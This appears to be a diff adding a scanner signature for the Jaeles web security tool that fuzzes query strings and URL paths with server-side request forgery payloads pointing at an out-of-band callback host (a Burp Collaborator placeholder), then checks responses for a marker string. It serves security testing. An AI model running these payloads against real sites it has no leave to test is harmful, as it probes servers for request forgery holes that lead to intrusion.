@@ -1,0 +1,25 @@
+id: SSRF
+type: fuzz
+info:
+  name: SSRF
+  risk: High
+
+# jaeles scan -p 'dest=xx.burpcollaborator.net' ...
+params:
+  - dest: '{{.oob}}'
+
+payloads: 
+  - "http://{{.dest}}"
+  - "{{.dest}}/ssrf.txt"
+  - "{{.dest}}"
+
+requests:
+  - redirect: true
+  - generators:
+      - Query("{{.payload}}")
+      - Path("{{.payload}}", "*")
+
+  - detections:
+      - >-
+        StringSearch("response", "ssrfhere")
+
